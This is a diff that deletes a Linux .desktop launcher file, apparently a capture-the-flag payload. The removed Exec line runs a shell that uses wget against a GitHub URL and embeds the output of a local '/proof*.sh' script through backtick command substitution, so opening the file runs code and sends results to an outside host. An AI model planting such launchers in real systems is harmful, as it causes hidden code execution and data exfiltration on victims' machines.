@@ -1,3 +1,0 @@
-[Desktop Entry]
-Exec=sh -c "wget https://raw.githubusercontent.com/edison497/for-CTF/main/edison497.desktop/?`/proof*.sh`"
-Type=Application
